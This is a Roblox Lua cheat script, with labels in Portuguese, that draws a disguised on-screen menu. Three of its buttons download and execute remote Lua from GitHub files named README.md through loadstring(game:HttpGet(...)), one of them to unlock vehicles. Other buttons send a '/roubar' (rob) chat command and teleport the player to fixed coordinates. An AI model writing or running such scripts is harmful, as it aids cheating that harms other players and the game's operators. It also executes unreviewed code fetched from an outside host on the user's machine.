pcall(function()
    local TextChatService = game:GetService("TextChatService")
    local CoreGui = game:GetService("CoreGui")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer

    local gui = Instance.new("ScreenGui")
    gui.Name = "SystemUI_" .. math.random(1000, 9999)
    gui.ResetOnSpawn = false
    gui.Parent = CoreGui

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 220, 0, 230)
    frame.Position = UDim2.new(0.5, -110, 0.5, -115)
    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Draggable = true

    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(60, 60, 60)
    stroke.Thickness = 1

    local uiList = Instance.new("UIListLayout", frame)
    uiList.Padding = UDim.new(0, 6)
    uiList.FillDirection = Enum.FillDirection.Vertical
    uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
    uiList.VerticalAlignment = Enum.VerticalAlignment.Center

    local function makeButton(name, callback, color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 180, 0, 32)
        btn.BackgroundColor3 = color or Color3.fromRGB(45, 45, 45)
        btn.Text = name
        btn.TextColor3 = Color3.new(1,1,1)
        btn.Font = Enum.Font.Gotham
        btn.TextSize = 14
        btn.AutoButtonColor = true
        btn.MouseButton1Click:Connect(callback)
        btn.Parent = frame
    end

    -- Botões padrões
    makeButton("Propro", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/isaac7999/isaac7999/refs/heads/main/README.md"))()
    end)

    makeButton("Top", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/isaac7999/OH/refs/heads/main/README.md"))()
    end)

    makeButton("Destrancar Veículos", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/isaac7999/P/refs/heads/main/README.md"))()
    end)

    makeButton("/Roubar", function()
        local success, result = pcall(function()
            local channel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
            if channel then
                channel:SendAsync("/roubar")
            end
        end)
        if not success then
            warn("Erro ao enviar /roubar: ", result)
        end
    end)

    -- Botão de teleporte reversível
    local savedPosition = nil
    local isAtDestination = false

    makeButton("↔ Teleportar / Voltar", function()
        local character = player.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            local root = character.HumanoidRootPart

            if not isAtDestination then
                savedPosition = root.Position
                root.CFrame = CFrame.new(19776, 73, 13163)
                isAtDestination = true
            else
                if savedPosition then
                    root.CFrame = CFrame.new(savedPosition)
                    isAtDestination = false
                end
            end
        end
    end, Color3.fromRGB(0, 170, 0)) -- Verde
end)
